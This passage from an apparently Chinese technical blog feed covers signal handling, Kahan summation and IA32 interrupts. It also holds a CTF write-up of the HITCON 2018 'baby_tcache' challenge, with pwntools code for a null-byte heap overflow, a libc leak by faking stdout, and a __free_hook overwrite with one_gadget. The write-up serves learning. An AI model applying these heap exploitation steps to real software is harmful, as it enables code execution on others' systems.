pendmask, blockmask;</span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nctrl+\\\n&quot;</span>);</span><br><span class="line">    siglongjmp(env, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// longjmp(env, 1);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    assert(sigemptyset(&amp;mask)==<span class="number">0</span>);</span><br><span class="line">    sigemptyset(&amp;pendmask);</span><br><span class="line">    sigemptyset(&amp;blockmask);</span><br><span class="line">    sigaddset(&amp;mask, SIGINT);</span><br><span class="line">    sigprocmask(SIG_BLOCK, &amp;mask, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGQUIT, signal_handler);<span class="comment">/*ctrl+\*/</span></span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="keyword">if</span> (sigsetjmp(env, <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// if (setjmp(env) != 0) &#123;</span></span><br><span class="line">        sigpending(&amp;pendmask);</span><br><span class="line">        sigprocmask(SIG_BLOCK, <span class="literal">NULL</span>, &amp;blockmask);</span><br><span class="line">        <span class="keyword">if</span> (sigismember(&amp;blockmask, SIGINT))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;in blockmask&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;not in blockmask&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        sigprocmask(SIG_UNBLOCK, &amp;mask, <span class="literal">NULL</span>);<span class="comment">//取消阻塞</span></span><br><span class="line">    sleep(<span class="number">2</span>);<span class="comment">/*按下ctrl+\*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sigsetjmp时</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^\</span><br><span class="line">ctrl+\</span><br><span class="line">in blockmask</span><br></pre></td></tr></table></figure><p>setjmp时</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">^\</span><br><span class="line">ctrl+\</span><br><span class="line">not in blockmask</span><br></pre></td></tr></table></figure><p>是这个意思了，这么简单的东西刚开始居然理解错了，艹</p><p>完成一下最初想做的事</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">jmp_buf env;</span><br><span class="line"><span class="type">void</span> <span class="title function_">signal_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">    siglongjmp(env, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__sighandler_t</span> rs = signal(SIGFPE, signal_handler);</span><br><span class="line">    assert(rs != SIG_ERR);</span><br><span class="line">    <span class="type">int</span> z = <span class="number">12</span>;</span><br><span class="line">    <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (sigsetjmp(env, <span class="number">1</span>) ==<span class="number">0</span> ) &#123;</span><br><span class="line">        z = z / t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, z); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">xxx</span><br><span class="line">12</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kahan</title>
      <link href="/2023/04/23/floating-point-calculation-and-kahan/"/>
      <url>/2023/04/23/floating-point-calculation-and-kahan/</url>
      
        <content type="html"><![CDATA[<h2 id="Floating-point-Calculation"><a href="#Floating-point-Calculation" class="headerlink" title="Floating-point Calculation"></a>Floating-point Calculation</h2><p>Kahan前复习一些浮点数的运算</p><p>A&#x3D;Ma*2<sup>Ea</sup></p><p>B&#x3D;Mb*2<sup>Eb</sup></p><p>假设(Ea&gt;&#x3D;Eb)</p><p>A±B&#x3D;(Ma±Mb*2<sup>Eb-Ea</sup>)*2<sup>Ea</sup></p><p>A*B&#x3D;(Ma*Mb)*2<sup>Ea+Eb</sup></p><p>A&#x2F;B&#x3D;(Ma&#x2F;Mb)*2<sup>Ea-Eb</sup></p><p>加减法先求阶差，小的阶码往大的转换，所以小的阶码的有效数需要右移两阶码差的绝对值，如果右移的过程中出现移出的情况，会把移出的位保存到临时的附加位上，有效数相加，结果规格化</p><p>运算过程中可能出现以下几种情况</p><ul><li>除以0</li><li>阶码上溢，单精度&gt; 127 ±inf</li><li>阶码下溢出，单精度&lt; -126 ± 0</li><li>有效数溢出 例如11.01 需要右归，需要把可能移出的位保存到临时附加位，这里最多右移一位，因为两有效数之和不可能达到4，所以有效数整数部分最多2位(11.)，保留一个1(1.)，最多右移一位</li><li>非规格化有效数，如0.11 需要左归</li><li>有效数全零，需要把阶码也置全零</li></ul><p>因为有了附加位精度会得到提升，但是也需要依靠附加位做舍入</p><p>IEEE 754给出了四种rounding方式</p><ul><li>就近舍入(默认)<ul><li>舍入到最接近，在一样接近的情况下偶数优先(二进制里以0结尾的)</li></ul></li><li>向+inf舍入</li><li>向-inf舍入</li><li>向0舍入</li></ul><h2 id="Kahan"><a href="#Kahan" class="headerlink" title="Kahan"></a>Kahan</h2><p>先看段代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TIMES 40000000</span></span><br><span class="line"><span class="type">float</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">float</span> test;</span><br><span class="line">test= <span class="number">1234567890</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>,test);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++)&#123;</span><br><span class="line">    sum += <span class="number">0.1</span>;</span><br><span class="line">&#125;</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line"><span class="number">1234567936.000000</span></span><br><span class="line"><span class="number">2097152.000000</span></span><br></pre></td></tr></table></figure><p>结果并没有我们想的那样，误差非常大</p><p>造成这种现象的原因主要有</p><p>0.1在内的好多数在我们浮点数里的无法精确表示 0 01111011 10011001100110011001101 有效数1001无效循环，类似与十进制的三分之一，相加的时候由于需要小的阶码往大的转换，小的有效数需要右移(我们的附加位有限)，两数相差小时，精度损失，当两数相差过大时，甚至存在大数吃小数的情况(右移成0.0的情况)，同时由于我们单精度浮点数有效数是23位，外加一个隐藏的1 可以表示十进制有效位数log(2<sup>24</sup>)约等于7位</p><p><strong>误差补偿算法Kahan</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++)&#123;</span><br><span class="line">    y = <span class="number">0.1</span> - c;</span><br><span class="line">    t = sum2 + y;</span><br><span class="line">    c = (t - sum2) - y;</span><br><span class="line">    sum2 = t;</span><br><span class="line">&#125;</span><br><span class="line">sum2-=c；</span><br></pre></td></tr></table></figure><p>主要思想就是计算出每次累计的舍入误差，添加到下一次计算上</p><p>c是对丢失的低位进行运算补偿的变量</p><p>当我们的sum2和y相差过大时，t会得到一个已经产生误差的值，我们用这个值去减原来的sum2(他们的两数相差不是很大，结果比较准确)然后减去这次的加数(同样两数相差不大，结果准确)就可以计算出这次计算的误差值，在下一次加法时去用这个误差修正结果</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TIMES 400000000</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">float</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">float</span> sum2 = <span class="number">0</span>, y = <span class="number">0</span>, t = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++) &#123;</span><br><span class="line">        sum += <span class="number">0.1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; TIMES; i++) &#123;</span><br><span class="line">        y = <span class="number">0.1</span> - c;</span><br><span class="line">        t = sum2 + y;</span><br><span class="line">        c = (t - sum2) - y;</span><br><span class="line">        sum2 = t;</span><br><span class="line">    &#125;</span><br><span class="line">    sum2 -= c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f\n&quot;</span>, sum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f&quot;</span>, sum2);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; gcc -O2 -o test test.c</span><br><span class="line">grxer@Ubuntu22-wsl ~/s/test&gt; ./test</span><br><span class="line">2097152.000000</span><br><span class="line">40000000.000000⏎  </span><br></pre></td></tr></table></figure><p>同时也可以看到这次我在TIMES比第一次后面多加了一个0，第一种累计法结果还是2097152.000000,也印证了相差过大时大数字会把小数字完全吃掉，本例中0.1阶码01111011&#x3D;123-127&#x3D;-4，2097152阶码10010100&#x3D;148-127&#x3D;21</p><p>0.1有效数需要右移25位，但是他的有效数算上隐藏1最多24位，推测一下应该有一位的附加位作保护位</p><h2 id="9-21日补档GRS"><a href="#9-21日补档GRS" class="headerlink" title="9.21日补档GRS"></a>9.21日补档GRS</h2><p>IEE754标准保证浮点数舍入误差在0.5upl内</p><blockquote><p>ulp(units in the last place):<strong>最后一位上的单位值</strong>或称<strong>最小精度单位</strong></p></blockquote><p>为了达到0.5upl误差，在upl后多加了保护位G（guard bit),舍入位R（round bit）和黏着位S（sticky bit）来提升精度</p><ul><li>舍入位右侧有非零是粘合位才置1</li></ul><p><a href="https://zhuanlan.zhihu.com/p/356960443">https://zhuanlan.zhihu.com/p/356960443</a> ：舍入与异常</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>IA32中断和异常(Interrupt And Exception)</title>
      <link href="/2023/04/22/IA32-Interrupt-Exception/"/>
      <url>/2023/04/22/IA32-Interrupt-Exception/</url>
      
        <content type="html"><![CDATA[<h1 id="IA32-Interrupt-And-Exception"><a href="#IA32-Interrupt-And-Exception" class="headerlink" title="IA32 Interrupt And Exception"></a>IA32 Interrupt And Exception</h1><p>不同体系架构中断和异常的定义内涵不太一样，可以理解，但是同一体系架构的不同教科书也不太一样，淦了</p><p>最后还是去读了一波intel的手册,RTFM!!!，在64-ia-32-architectures-software-developer-vol-3a-part-1-manual的chapter 6</p><p><a href="https://www.intel.cn/content/www/cn/zh/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html">https://www.intel.cn/content/www/cn/zh/architecture-and-technology/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.html</a></p><h3 id="EFLAGS寄存器"><a href="#EFLAGS寄存器" class="headerlink" title="EFLAGS寄存器"></a>EFLAGS寄存器</h3><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422194723461.png" alt="image-20230422194723461"></p><h2 id="Interrupt"><a href="#Interrupt" class="headerlink" title="Interrupt"></a>Interrupt</h2><p>The processor receives interrupts from two sources:<br>• External (hardware generated) interrupts.<br>• Software-generated interrupts.(如int n来调用n中断)</p><p>通常是由CPU外部的输入输出设备（硬件）所触发的，希望cpu停下手里的任务去执行对应得中断处理程序，之后再回到手里任务来，所以中断是异步的，被叫做异步中断或硬件中断</p><p>cpu提供了两引脚</p><p>INTR（INTeRrupt）可屏蔽中断(maskable interrupt)通过INTR向CPU发生请求</p><p>NMI（Non Maskable Interrupt）不可屏蔽中断(nonmaskable interrupt)通过NMI向CPU发生请求</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422194043252.png" alt="image-20230422194043252"></p><p>可以通过CLI清除EFLAGS寄存器里IF(Interrupt enable Flag)位(IF&#x3D;0)来禁止可屏蔽中断发生，STI(IF&#x3D;1)允许可屏蔽中断发生(IA32只有在响应中断时把IF&#x3D;0关闭中断，响应异常的时候不会关闭)</p><p>不可屏蔽中断，意如其名</p><h2 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h2><p>The processor receives exceptions from three sources:<br>• Processor-detected program-error exceptions.<br>• Software-generated exceptions.<br>• Machine-check exceptions.</p><p>异常通常是CPU在执行指令时因为检测到预先定义的某个或多个条件而产生的同步事件,又被叫做同步中断，来自处理器内部，IF位在这里不起任何作用，立即执行</p><ul><li><p>故障(Fault)</p><blockquote><p>可能被异常处理程序修复，如果修复，再返回到当前引起异常的指令，比如说我们的缺页异常，指令引用一个虚拟地址，发现他对应的的物理页面不在内存，异常处理程序会把它从磁盘取出来放到内存，加载后再回到该指令就可以正常执行，修复不了，终止</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422202900753.png" alt="image-20230422202900753"></p></blockquote></li><li><p>陷阱(Traps)</p><blockquote><p>有意的异常，执行完陷阱指令后，报告给cpu异常，比如我们的int n(有的书里把这个叫做软中断)，int3, into(溢出检测)，bound(地址越界检测),ud2(未定义指令)等，最重要的作用就是提供用户和内核的接口–系统调用，异常处理程序的返回地址指向导致异常指令的下一个指令地址</p></blockquote></li><li><p>终止(Aborts)</p><blockquote><p>直接终止，处理程序将控制返回给一个abort例程，该例程会终止这个应用程序</p></blockquote></li></ul><h2 id="中断向量表（Interrupt-Vector-Table，IVT）"><a href="#中断向量表（Interrupt-Vector-Table，IVT）" class="headerlink" title="中断向量表（Interrupt Vector Table，IVT）"></a>中断向量表（Interrupt Vector Table，IVT）</h2><p>实模式下用于存储中断处理程序入口的表</p><p>系统开机后处于实模式，1M的寻址空间，由BOIS做检测和初始化，初始化就包括了在00000H~003ffh 1kb区域建立中断向量表，表里的每一项记录中断或异常处理程序的入口地址，叫做中断向量，占4个字节，所以共有256个，BIOS再利用INT执行特定中断处理程序把引导程序从磁盘加载到内存，引导后，进入保护模式</p><h2 id="中断描述符表（Interrupt-Descriptor-Table，IDT）"><a href="#中断描述符表（Interrupt-Descriptor-Table，IDT）" class="headerlink" title="中断描述符表（Interrupt Descriptor Table，IDT）"></a>中断描述符表（Interrupt Descriptor Table，IDT）</h2><p>保护模式下用于存储中断处理程序入口的表</p><p>IDTR寄存器来描述的IDT的位置和长度lidt指令可以往idtr里装入数据，和GDTR一样前32位是idt地址，16位表长度描述表的大小，为0时大小是1</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422230738609.png" alt="image-20230422230738609"></p><p>IDT的每个表项是一个8字节的门描述符（Gate Descriptor）结构</p><p>我们之前的段描述符中描述的是一片内存区域，而门描述符中描述的是一段代码</p><p>还记得我们之前段描述符的S&#x3D;0代表该描述符描述的是一个系统段，S&#x3D;1代表该描述符描述的是代码段、数据段或堆栈段，TYPE和S段配合使用，段的访问权限或系统控制描述类型</p><p>这里的门就是系统段S&#x3D;0，根据TYPE不同分为不同门</p><p>任务门描述符 0101 用于任务切换</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422232250447.png" alt="image-20230422232250447"></p><p>中断门描述符 D110 用于描述中断处理例程的入口  IF位自动置 0</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422232346158.png" alt="image-20230422232346158"></p><p>陷阱门描述符 D111 用于描述异常处理例程的入口 IF位不会自动置0</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230422232525942.png" alt="image-20230422232525942"></p><p>D位用来表示描述的是16位门（0）还是32位门（1），同样DPL表示访问本段的 最低权限要求</p><h2 id="异常和中断处理过程"><a href="#异常和中断处理过程" class="headerlink" title="异常和中断处理过程"></a>异常和中断处理过程</h2><p>CPU收到中断向量号后，把IDTR里IDT基地址+中断向量号*8得到中断门描述符</p><p>如果是使用INT3 int n INTO等指令产生的中断或异常，会检测CPL和门描述符里的DPL，CPL权限必须大于等于DPL，</p><p>然后再次检测CPL权限必须小于门描述符里选择子对于代码段的DPL，也就是特权转移处理除了返回，只能从低权限转到高权限</p><p>如果是由硬件产生的中断或处理器检测到的异常，不会进行第一次和门描述符DPL的检测，只和代码段检测</p><p>把选择子加载到cs 偏移加载到eip执行</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230423013430409.png" alt="image-20230423013430409"></p><h2 id="中断发生时的压栈"><a href="#中断发生时的压栈" class="headerlink" title="中断发生时的压栈"></a>中断发生时的压栈</h2><p>拿到中断描述符后CPL和描述符里的选择子对应当的DPL比较</p><p>&gt;&gt;&gt;CPL权限低于DPL的话需要切换到高特权级的栈，为了执行完中断后恢复，会先临时保存当前栈的ss和esp，从TSS段里拿到DPL级别的栈加载到ss和esp，然后把临时保存的旧ss：esp压入新栈，然后压入eflags寄存器，cs，eip,有的中断还会压入出错码</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230423020740539.png" alt="image-20230423020740539"></p><p>&gt;&gt;&gt;CPL&#x3D;DPL是不用切换堆栈，故不用压入原ss esp，其余一样</p><p><img src="/2023/04/22/IA32-Interrupt-Exception/image-20230423021021604.png" alt="image-20230423021021604"></p><p>然后选择子加载到cs 偏移加载到ei，执行中断处理程序，中断执行完用iret指令返回被中断程序，iret会把eip cs eflags弹出到寄存器，iret执行时esp必须指向eip，所以我们必须自己弹出出错码</p><p>iret同样会进行权限检测，进行逆过程决定是不是弹出就ss:esp</p><h2 id="IA32中断向量号"><a href="#IA32中断向量号" class="headerlink" title="IA32中断向量号"></a>IA32中断向量号</h2><p>0-255</p><p>其中0-31被cpu设计者占用，32-255供操作系统等使用</p><table><thead><tr><th></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>32-255</td><td>用户定义中断</td><td>中断</td><td>可屏蔽中断</td><td>来自INTR的外部中断或INT n指令</td><td></td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2018 HITCON PWN baby_tcache</title>
      <link href="/2023/04/19/HITCON-2018-PWN-baby-tcache/"/>
      <url>/2023/04/19/HITCON-2018-PWN-baby-tcache/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1LiWzcGrrdDOI3gH6EXhQzA">https://pan.baidu.com/s/1LiWzcGrrdDOI3gH6EXhQzA</a><br>提取码：79ui</p><p>libc2.27</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/c/p/heap&gt; checksec baby_tcache</span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/ctfwiki/pwn/heap/baby_tcache&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>只有add和delete功能，最多10个chunk，漏洞也很容易找到</p><p>new里的<code> v3[size] = 0;</code>null byte one漏洞</p><p>很容易可以利用去构成overlapping chunk 去做freehook就行了，但是程序没有输出，怎么泄露libc呢</p><p>输出函数只有printf和puts，printf在IOFILE里分析过了看下puts把</p><p><code>libio/ioputs.c</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>熟悉的_IO_sputn调用，fwrite的主要函数，最终会输出<code>_IO_2_1_stdout_</code>中_IO_write_base~IO_write_ptr之间的内容，虽然程序用setvbuf关了缓冲区，但是setvbuf是打开_IO_2_1_stdout_的flag低两个bit来关闭缓冲区的，如果我们可以控制底层的flag，还怕这个?</p><p>思路把_IO_2_1_stdout_链入bin伪造一波，获取libc，利用overlapping做freehook</p><h3 id="overlapping-chunk"><a href="#overlapping-chunk" class="headerlink" title="overlapping chunk"></a>overlapping chunk</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x500</span>-<span class="number">0x8</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x50</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x500</span> - <span class="number">0x8</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x70</span>) <span class="comment"># 6 //防止0和5合并时，和topchunk合并</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + <span class="string">b&#x27;\x60\x06&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>申请了6个堆</p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419233901431.png" alt="image-20230419233901431" style="zoom:80%;"><p>想让堆5做先前合并到0，就需要修改堆5的prevsize和previnuse位，</p><p>释放堆5时要制造前面所有堆块是一个大堆块且free状态的假象，prevsize&#x3D;0x500+0x40+0x50+0x60+0x70&#x3D;0x660</p><p>释放4再申请0x68拿回来原来的chunk，由于空间复用和null byte overflow 可以修改堆5的prevsize和previnuse位</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234348442.png" alt="image-20230419234348442"></p><p>释放0再释放5构成unlink，导致overlapping</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234533161.png" alt="image-20230419234533161"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234624496.png" alt="image-20230419234624496"></p><p>大小为0x660+0x500&#x3D;0xB60符合预期</p><p>同时把堆2放入bin里为下一步做准备</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419234602649.png" alt="image-20230419234602649"></p><h3 id="IO-2-1-stdout入链"><a href="#IO-2-1-stdout入链" class="headerlink" title="IO_2_1_stdout入链"></a>IO_2_1_stdout入链</h3><p>我们可以切割unsortedbin来让在tcachebin的堆2的fd指向unsortedbin，</p><p>切割大小为0x500+0x40，减去chunkhead为0x530大小</p><p>add(0x530)</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419235740115.png" alt="image-20230419235740115"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230419235803167.png" alt="image-20230419235803167"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420000100153.png" alt="image-20230420000100153"></p><p>申请出来尾号1790的chunk，把他的fd低两个字节改掉就可以入链</p><p><code>add(0xa0, b&#39;\x60\xc7&#39;)</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420000346155.png" alt="image-20230420000346155"></p><h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>拿出来stdout进行伪造</p><p>flag需要满足</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br></pre></td></tr></table></figure><p>即flag&#x3D;0xFBAD1800</p><p><code>add(0x40)</code></p><p><code>add(0x3f,p64(0xfbad1800) + p64(0) * 3 + b&#39;\x00&#39;)</code></p><p>为什么会是3f这么奇怪的数字而不是直接0x40大小，应为我们程序会v3[size] &#x3D; 0;会在申请到的堆0x7ffff7bec760+size位置零，在stdout的IO_FILE结构体里随便置零极有可能导致程序crash掉</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003158991.png" alt="image-20230420003158991"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003516321.png" alt="image-20230420003516321"></p><p>所以我们选择了一块本来就是零的地方，0x3e 0x3f 0x47 0x48都可以</p><p>修改前</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420001600223.png" alt="image-20230420001600223"></p><p>修改后</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420003955229.png" alt="image-20230420003955229"></p><p>下次输出菜单时即可泄露地址</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420004449167.png" alt="image-20230420004449167"></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420004531732.png" alt="image-20230420004531732"></p><h3 id="freehook"><a href="#freehook" class="headerlink" title="freehook"></a>freehook</h3><p>这个时候我们看下unsortbin</p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420005729367.png" alt="image-20230420005729367"></p><p>哟，这不是我们的堆4吗，如果我们在前面</p><p><code>add(0x40)</code></p><p><code>add(0x3f,p64(0xfbad1800) + p64(0) * 3 + b&#39;\x00&#39;)</code>的时候释放掉chunk4时，不就可以把chunk4放入tcache吗</p><p><code>delete(4) add(0x530) add(0xa0, b&#39;\x60\xc7&#39;)</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010052891.png" alt="image-20230420010052891"></p><p>两次申请freehook里写入onegadget即可</p><p><code>add(0x60,p64(libcelf.symbols[&#39;__free_hook&#39;]))</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010633032.png" alt="image-20230420010633032"></p><p><code>add(0x60) add(0x60,p64(onegadget))</code></p><p><code>delete(0)</code></p><p><img src="/2023/04/19/HITCON-2018-PWN-baby-tcache/image-20230420010811418.png" alt="image-20230420010811418"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./baby_tcache&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=ELF(<span class="string">&#x27;/mnt/hgfs/Share/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span 